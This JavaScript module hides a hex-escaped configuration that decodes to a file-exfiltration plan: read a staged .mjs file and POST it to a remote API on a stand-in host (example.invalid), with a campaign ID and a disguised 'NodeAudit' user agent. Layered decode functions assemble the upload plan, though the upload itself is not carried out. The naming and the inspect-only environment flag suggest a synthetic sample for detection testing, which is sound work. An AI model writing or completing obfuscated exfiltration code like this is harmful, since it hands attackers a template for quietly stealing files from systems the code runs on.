const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_93f7ffe0 = "\\x76\\x3d\\x31\\x7c\\x73\\x74\\x65\\x70\\x73\\x3d\\x72\\x65\\x61\\x64\\x5f\\x66\\x69\\x6c\\x65\\x2c\\x74\\x72\\x61\\x6e\\x73\\x6d\\x69\\x74\\x5f\\x72\\x65\\x6d\\x6f\\x74\\x65\\x7c\\x61\\x64\\x61\\x70\\x74\\x65\\x72\\x3d\\x66\\x65\\x74\\x63\\x68\\x5f\\x70\\x6f\\x73\\x74\\x7c\\x73\\x74\\x61\\x67\\x65\\x5f\\x63\\x6f\\x75\\x6e\\x74\\x3d\\x31\\x7c\\x63\\x61\\x6d\\x70\\x61\\x69\\x67\\x6e\\x5f\\x69\\x64\\x3d\\x4e\\x4f\\x44\\x45\\x2d\\x34\\x44\\x33\\x34\\x32\\x31\\x32\\x32\\x7c\\x75\\x72\\x6c\\x3d\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x6e\\x6f\\x64\\x65\\x2d\\x34\\x64\\x33\\x34\\x32\\x31\\x32\\x32\\x62\\x38\\x37\\x33\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2e\\x69\\x6e\\x76\\x61\\x6c\\x69\\x64\\x2f\\x61\\x70\\x69\\x7c\\x75\\x73\\x65\\x72\\x5f\\x61\\x67\\x65\\x6e\\x74\\x3d\\x4e\\x6f\\x64\\x65\\x41\\x75\\x64\\x69\\x74\\x2f\\x34\\x64\\x33\\x34\\x7c\\x66\\x69\\x6c\\x65\\x5f\\x70\\x61\\x74\\x68\\x3d\\x2f\\x74\\x6d\\x70\\x2f\\x68\\x75\\x6e\\x74\\x72\\x65\\x73\\x73\\x2d\\x6e\\x6f\\x64\\x65\\x2f\\x2e\\x73\\x74\\x61\\x67\\x65\\x2d\\x34\\x64\\x33\\x34\\x32\\x31\\x32\\x32\\x62\\x38\\x37\\x33\\x2e\\x6d\\x6a\\x73";

const Codec_93f7ffe0 = "escaped_octets|identity|";



function load_93f7ffe0() { return [...Material_93f7ffe0.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_93f7ffe0(e) { return [...e]; }

async function recover_93f7ffe0() {

  const n = "";

  const e = load_93f7ffe0(); let d = [];

  let p = 0; while (p++ < 1) d = decode_93f7ffe0(e);

  void n; return Buffer.from(d).toString("ascii");

}

async function inspect_93f7ffe0() { return JSON.parse(JSON.stringify({ value: await recover_93f7ffe0() })).value; }

async function plan_93f7ffe0() { const inspect = inspect_93f7ffe0; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "fetch_post", source: fields.file_path, url: fields.url }); }

void moduleShape; void plan_93f7ffe0;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_93f7ffe0());

